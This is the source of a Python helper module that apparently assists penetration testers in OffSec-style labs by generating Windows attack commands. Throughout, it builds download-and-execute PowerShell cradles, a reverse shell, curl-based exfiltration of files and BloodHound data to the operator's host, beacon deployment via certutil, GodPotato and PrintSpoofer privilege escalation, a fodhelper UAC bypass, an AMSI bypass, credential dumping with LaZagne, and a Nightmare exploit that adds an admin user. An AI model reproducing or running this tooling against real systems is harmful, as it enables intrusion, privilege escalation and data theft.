"""
Main file for all commands prefixed with "win"
"""
import hh.tmux
import hh.utils
import os
import shutil
import log
from config import cfg
import time

from hh.tools import (ThirdPartyTool, Twin_ligolo_agent, Twin_powermad, Tpowerview, Tpowerup, Twin_oneforall,
                      Twin_pillage_stage1, Twin_pillage_stage2, Tgodpotato, Twinpeas_obf, Twinpeas_ps1, Twinpwn,
                      Tnightmare, Tmssqland, Twinvpncheck, Tprivesccheck, Tsharphound, Tapplocker_awl, Tpowerphound,
                      Trubeus, Tprintspoofer, Tpsexec, Twinenum, Tspoolsample, Teverything, Tlazagne, Tuacps1,
                      Twuffamsi, Tsigmapotato)


def encode_download(tool: ThirdPartyTool):
    cmd = cfg.TEMPLATE_POWERSHELL_DOWNLOAD.format(tool.url, tool.file_name)
    hh.utils.pandc(cmd)


def encode_iex(tool: ThirdPartyTool):
    cmd = cfg.TEMPLATE_POWERSHELL_IEX.format(tool.url)
    hh.utils.pandc(cmd)


def win_powerview():
    cmd = cfg.TEMPLATE_POWERSHELL_DOWNLOAD.format(Tpowerview.url, Tpowerview.file_name)
    cmd2 = cfg.TEMPLATE_POWERSHELL_IEX.format(Tpowerview.url)
    hh.utils.win_encode(cmd)
    print('\n' + cmd + '\n')
    hh.utils.win_encode(cmd2)
    hh.utils.pandc(cmd2)
    print('Import-Module .\\PowerView.ps1')


def win_uac():
    cmd1 = cfg.TEMPLATE_POWERSHELL_IEX.format(Tuacps1.url)
    hh.utils.pandc(cmd1)


def win_powerup():
    cmd = cfg.TEMPLATE_POWERSHELL_IEX.format(Tpowerup.url)
    hh.utils.pandc(cmd)


def win_privesccheck():
    cmd = cfg.TEMPLATE_POWERSHELL_IEX.format(Tprivesccheck.url) + ';Invoke-PrivescCheck'
    hh.utils.win_encode(cmd)
    hh.utils.pandc(cmd)


def win_shell(port=9001):
    # TODO FIX
    current_folder = hh.utils.get_hh_folder()
    shell = os.path.join(current_folder, 'app', 'custom', 'shell.ps1')
    if os.path.exists(shell):
        os.remove(shell)
    cr = hh.utils.os_call(['cp', cfg.POWERSHELL_TCP, shell])
    with open(shell, 'a') as f:
        f.write('\n')
        f.write(f'Invoke-PowerShellTcp -Reverse -IPAddress {hh.utils.get_ip()} -Port {port}')
    cmd = cfg.TEMPLATE_POWERSHELL_IEX.format(hh.utils.get_web() + 'www/shell.ps1')
    hh.utils.pandc(cmd)
    hh.utils.win_encode(cmd)
    print(f'nc -lvnp {port}')


def win_ligolo():
    hh.utils.ligolo_server_help()
    cmd = cfg.TEMPLATE_CERTUTIL_DOWNOAD.format(hh.utils.get_web() + 'dist/' + Twin_ligolo_agent.file_name,
                                               Twin_ligolo_agent.file_name)
    connect = f'./{Twin_ligolo_agent.file_name} -connect {hh.utils.get_ip()}:11601 -ignore-cert'
    hh.utils.pandc(cmd)
    sliver_upload = f'upload {Twin_ligolo_agent.fullpath} C:\\\\Folder1\\\\agent.exe'
    sliver_connect = f'execute C:\\\\Folder1\\\\agent.exe -connect  {hh.utils.get_ip()}:11601 -ignore-cert'
    print(sliver_upload + '\n' + sliver_connect + '\n')
    print(connect)


def win_powermad():
    encode_iex(Twin_powermad)


def win_enum():
    cmd = cfg.TEMPLATE_POWERSHELL_IEX_TEE.format(Twinenum.url)

    # exfil
    cmd2 = f""";$file = Get-ChildItem enum-$env:USERNAME-$env:COMPUTERNAME.txt | Select-Object -First 1; C:\\Windows\\System32\\curl.exe -X POST {hh.utils.get_web()}upload/generic/$env:COMPUTERNAME -F "file=@$($file.FullName)" """
    # encode_iex(Twinenum)

    combined = cmd + cmd2
    hh.utils.win_encode(combined)
    hh.utils.pandc(combined)


def win_nc():
    encode_download('nc.exe')


def win_sigmapotato():
    encode_download(Tsigmapotato)


def win_peas():
    encode_download(Twinpeas_obf)
    encode_iex(Twinpeas_ps1)


def win_amsibypass():
    encode_iex(Twuffamsi)


def win_pwn():
    encode_download(Twinpwn)
    cmd = f'Import-Module .\\{Twinpwn.file_name}'
    print(cmd)


def win_mssqland():
    encode_download(Tmssqland)


def win_everything():
    encode_download(Teverything)


def win_lazagne():
    encode_download(Tlazagne)


def win_nightmare():
    cmd = cfg.TEMPLATE_POWERSHELL_IEX.format(
        Tnightmare.url) + ';Invoke-Nightmare -DriverName "Xerox" -NewUser "aesir" -NewPassword "HansUeli88"'
    hh.utils.pandc(cmd)


def win_vpn_healtcheck():
    """Hyper specific for OffSec VPNs"""
    encode_download(Twinvpncheck)


def win_rubeus():
    encode_download(Trubeus)


def win_psexec():
    encode_download(Tpsexec)


def win_spoolsample():
    encode_download(Tspoolsample)


def win_sharphound():
    """download and collect"""
    cmd = cfg.TEMPLATE_POWERSHELL_DOWNLOAD.format(Tsharphound.url, Tsharphound.file_name)
    sharp = ';.\\SharpHound.exe -c All,GPOLocalGroup'
    hh.utils.pandc(cmd + sharp)


def win_powerhound():
    """SharpHound.ps1"""
    cmd = cfg.TEMPLATE_POWERSHELL_IEX.format(Tpowerphound.url)
    collection = ';Invoke-BloodHound -c All -OutputDirectory C:\\Users\\Public'
    hh.utils.pandc(cmd + collection)


def win_autohound():
    """
    download and collect and upload
    Custom powershell script for upload magic
    """
    exec = cfg.TEMPLATE_POWERSHELL_DOWNLOAD.format(Tsharphound.url, Tsharphound.file_name)
    sharp = ';.\\SharpHound.exe -c All,GPOLocalGroup'
    download = f""";$file = Get-ChildItem *BloodHound.zip | Select-Object -First 1; C:\\Windows\\System32\\curl.exe -X POST {hh.utils.get_web()}upload/bloodhound -F "file=@$($file.FullName)" """
    hh.utils.pandc(exec + sharp + download)


def win_exfil():
    """Uploads all files from the current working directory"""
    pass


def win_pillage():
    """
    Stage 1) win_pillage()
        a) Patch first powershell with correct IP for stage 2
        b) create stage 2
    Stage 2) execute stage 2

    """
    # on demand tool
    stage1 = ThirdPartyTool('Pillage.ps1', 'Pillage.ps1')
    stage2 = ThirdPartyTool('Pillage-Stage2.ps1', 'Pillage-Stage2.ps1')

    if os.path.exists(stage1.fullpath):
        os.remove(stage1.fullpath)

    if os.path.exists(stage2.fullpath):
        os.remove(stage2.fullpath)

    with open(stage1.fullpath, 'w') as stage1f:
        with open(Twin_pillage_stage1.fullpath, 'r') as stage1ftemplate:
            template = stage1ftemplate.read()

        stage1f.write(template)
        stage1f.write(f"IEX(New-Object System.Net.WebClient).DownloadString('{stage2.url}')")

    with open(stage2.fullpath, 'w') as stage2f:
        with open(Twin_pillage_stage2.fullpath, 'r') as stage2ftemplate:
            template2 = stage2ftemplate.read()

        stage2f.write(template2)
        stage2f.write(f'Pillage-Stage2 "{hh.utils.get_web()}"')

    cmd = cfg.TEMPLATE_POWERSHELL_IEX.format(stage1.url)
    cmd2 = cfg.TEMPLATE_SLIVER_POWERSHELL_IEX_NO_OUTPUT.format(stage1.url)
    hh.utils.win_encode(cmd)
    print('\n' + cmd + '\n')
    hh.utils.pandc(cmd2)


def win_beacon(port=8766):
    """OneForAll accepts lhost, lport in two ways
        a) filename lhost_lport.exe
        b) oneforall.exe lhost lpor
    """

    name = f'{hh.utils.get_ip()}_{port}.exe'
    beacon = ThirdPartyTool(name, name)
    shutil.copy(Twin_oneforall.fullpath, beacon.fullpath)

    # sliver command
    sliver_cmd_prep = 'mkdir C:\\Folder1'
    sliver_cmd = f'upload {beacon.fullpath} C:\\Folder1\\{name}'

    auto_beacon = f"""C:\\Windows\\System32\\curl.exe -o $env:temp\\{name} "{beacon.url}";& "$env:temp\\{beacon.file_name}" """

    certutil = cfg.TEMPLATE_CERTUTIL_DOWNOAD.format(
        beacon.url, 'C:\\Users\\Public\\' + beacon.name) + ' & C:\\Users\\Public\\' + beacon.name

    cmd = cfg.TEMPLATE_WINDOWS_CURL.format(beacon.name, beacon.url)
    print(cmd + '\n')
    print(certutil)
    hh.utils.win_encode(certutil)

    print(auto_beacon)
    hh.utils.win_encode(auto_beacon)

    # C:\Windows\System32\curl.exe -o $env:temp\192.168.45.157_8766.exe "http://192.168.45.157:7999/dist/192.168.45.157_8766.exe";&"$env:temp\192.168.45.157_8766.exe"


def win_godpotato(port=8766):
    """
    This will exploit SeImpersonatePrivilege
    Note: escaping \\ sometimes is needed double and sometimes not
    """
    # create staging folder
    remote_folder = 'C:\\\\Folder1'
    sliver_cmd = f'mkdir {remote_folder}'
    sliver = hh.tmux.get_sliver_pane()
    hh.tmux.pane_send_keys(sliver, sliver_cmd)

    # upload godpotato
    sliver_cmd = f'upload {Tgodpotato.fullpath} C:\\\\Folder1\\\\{Tgodpotato.file_name}'
    hh.tmux.pane_send_keys(sliver, sliver_cmd)

    # gen beacon
    name = f'{hh.utils.get_ip()}_{port}.exe'
    beacon = ThirdPartyTool(name, name)
    shutil.copy(Twin_oneforall.fullpath, beacon.fullpath)

    # upload beacon
    sliver_cmd = f'upload {beacon.fullpath} C:\\\\Folder1\\\\{name}'
    hh.tmux.pane_send_keys(sliver, sliver_cmd)

    # wait 2 seconds
    time.sleep(2)

    # SeImpersonate with reverse shell
    sliver_cmd = f"""execute -o cmd /c ' C:\\Folder1\\{Tgodpotato.file_name} -cmd "C:\\Folder1\\{name}"'"""
    hh.tmux.pane_send_keys(sliver, sliver_cmd)


def win_printspoofer(port=8766):
    """
    Alternate exploit to godpotato
    """
    # create staging folder
    remote_folder = 'C:\\\\Folder1'
    sliver_cmd = f'mkdir {remote_folder}'
    sliver = hh.tmux.get_sliver_pane()
    hh.tmux.pane_send_keys(sliver, sliver_cmd)

    # upload PrintSpoofer
    sliver_cmd = f'upload {Tprintspoofer.fullpath} C:\\\\Folder1\\\\{Tprintspoofer.file_name}'
    hh.tmux.pane_send_keys(sliver, sliver_cmd)

    # gen beacon
    name = f'{hh.utils.get_ip()}_{port}.exe'
    beacon = ThirdPartyTool(name, name)
    shutil.copy(Twin_oneforall.fullpath, beacon.fullpath)

    # upload beacon
    sliver_cmd = f'upload {beacon.fullpath} C:\\\\Folder1\\\\{name}'
    hh.tmux.pane_send_keys(sliver, sliver_cmd)

    # wait 2 seconds
    time.sleep(2)

    # SeImpersonate with reverse shell
    sliver_cmd = f"""execute -o C:\\\\Folder1\\\\{Tprintspoofer.file_name} -c "C:\\Folder1\\{name}" """
    hh.tmux.pane_send_keys(sliver, sliver_cmd)


def win_sliverhound():
    """
    Run bloodhound collector via sliver beacon
    """
    sliver_cmd = f"sharp-hound-4 -- -c all --outputdirectory 'C:\\Users\\Public\\' --zipfilename bloodhound.zip"
    sliver = hh.tmux.get_sliver_pane()
    hh.tmux.pane_send_keys(sliver, sliver_cmd)

    sliver_cmd = "ls 'C:\\Users\\Public'"
    hh.tmux.pane_send_keys(sliver, sliver_cmd)
    # parse output?


def win_applocker():
    """
    Deploys an executable to be use with AWL InstallUtil to execute PowerShell and Bypass Amsi
    """
    # upload applocker
    sliver_cmd = f'upload {Tapplocker_awl.fullpath} C:\\\\Users\\\\Public\\\\{Tapplocker_awl.name}'
    sliver = hh.tmux.get_sliver_pane()
    hh.tmux.pane_send_keys(sliver, sliver_cmd)

    # enter shell
    cmd = f"C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\installutil.exe /logfile= /LogToConsole=true /rhost={hh.utils.get_ip()} /revshell=true /rport=9001 /U C:\\Users\\Public\\{Tapplocker_awl.name}"
    hh.utils.pandc(cmd)
    log.info('Execute the CMD in an interactive shell!')


def win_fodhelper(port=8766):
    """
    Uses fodhelper to bypass UAC
    """

    # expects a sliver-session with medium integrity control and admin privs

    # I'm duplicating this code????
    ##########
    ##########
    # create staging folder
    remote_folder = 'C:\\\\Folder1'
    sliver_cmd = f'mkdir {remote_folder}'
    sliver = hh.tmux.get_sliver_pane()
    hh.tmux.pane_send_keys(sliver, sliver_cmd)

    # upload PrintSpoofer
    sliver_cmd = f'upload {Tprintspoofer.fullpath} C:\\\\Folder1\\\\{Tprintspoofer.file_name}'
    hh.tmux.pane_send_keys(sliver, sliver_cmd)

    # gen beacon
    name = f'{hh.utils.get_ip()}_{port}.exe'
    beacon = ThirdPartyTool(name, name)
    shutil.copy(Twin_oneforall.fullpath, beacon.fullpath)

    # upload beacon
    sliver_cmd = f'upload {beacon.fullpath} C:\\\\Folder1\\\\{name}'
    hh.tmux.pane_send_keys(sliver, sliver_cmd)

    # set
    powershell_cmd = f"""New-Item -Path HKCU:\\Software\\Classes\\ms-settings\\shell\\open\\command -Value C:\\Folder1\\{name} -Force
New-ItemProperty -Path HKCU:\\Software\\Classes\\ms-settings\\shell\\open\\command -Name DelegateExecute -PropertyType String -Force
C:\\Windows\\System32\\fodhelper.exe"""

    powershell_enc = hh.utils.win_encode(powershell_cmd)

    print('[+] PowerShell Payloads')
    print(powershell_cmd + '\n\n' + powershell_enc)

    print('[!] Fodhelper not around? Try:')
    print('ComputerDefaults.exe')


def win_download():
    """
    Exfiltrate all files from the current working directry
    """
    download = "Get-ChildItem -File | Foreach { C:\\Windows\\System32\\curl.exe -X POST " + hh.utils.get_web(
    ) + 'upload/generic/$env:COMPUTERNAME -F "file=@$($_.FullName)" }'
    hh.utils.pandc(download)


def win_local():
    """
    shorthand to type local.txt hostname ipconfig
    """
    cmd = 'type local.txt;whoami;hostname;ipconfig'
    hh.utils.pandc(cmd)


def win_proof():
    """
    shorthand to type local.txt hostname ipconfig
    """
    cmd = 'type C:\\Users\\Administrator\\Desktop\\proof.txt;whoami;hostname;ipconfig'
    hh.utils.pandc(cmd)
